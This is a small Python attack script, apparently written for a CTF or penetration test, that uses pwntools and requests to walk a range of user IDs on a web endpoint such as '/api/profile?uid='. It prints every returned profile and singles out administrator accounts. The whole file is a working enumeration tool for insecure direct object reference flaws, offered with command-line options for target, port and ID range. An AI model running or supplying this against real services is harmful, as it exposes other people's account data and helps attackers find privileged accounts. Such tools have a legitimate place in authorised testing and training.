from optparse import *
from pwn import *   
import os,urllib.parse,base64,requests,signal,sys

def signal_handler(signal, frame):
  sys.exit(0)

def pwn_start():
    log.info('Enumerating')
    return log.progress('Using payload')

def enumerate_user_info(ip,port,path,start,end):
    try:
        for i in range(start,end):
            payload = f'http://{ip}:{port}{path}{i}'
            req = requests.get(payload)
            progress.status(f'{payload}')
            if req.text != "" and req.status_code == 200:
                if "admin" in req.text.lower() or "administrator" in req.text.lower():
                    print('\nADMIN FOUND')
                    print(f'{req.text}\n')
                else:    
                    print(req.text)
    except Exception:
        print('Error...')
        print(Exception)
        parser.print_help()

signal.signal(signal.SIGINT, signal_handler)    
progress = pwn_start()

usage = "usage: %prog [options] arg1 arg2"
parser = OptionParser()
parser.add_option("-t", "--target", action="store", type="str", dest="target",help="Set the target url (use it without 'http://')")
parser.add_option("-p", "--port", action="store", type="str", dest="port",help="Set the port")
parser.add_option("-s", "--start", action="store", type="int", dest="start",help="Number of uid the to start fuzzing")
parser.add_option("-e", "--end", action="store", type="int", dest="end",help="Number of uid the to finish fuzzing")
parser.add_option("-g", "--get", action="store", type="str", dest="get",help="Get request path url (e.g. /api/profile?uid=)")

(options, args) = parser.parse_args()

ip = options.target
port = options.port
start = options.start
end = options.end
get = options.get

enumerate_user_info(ip, port, get, start, end)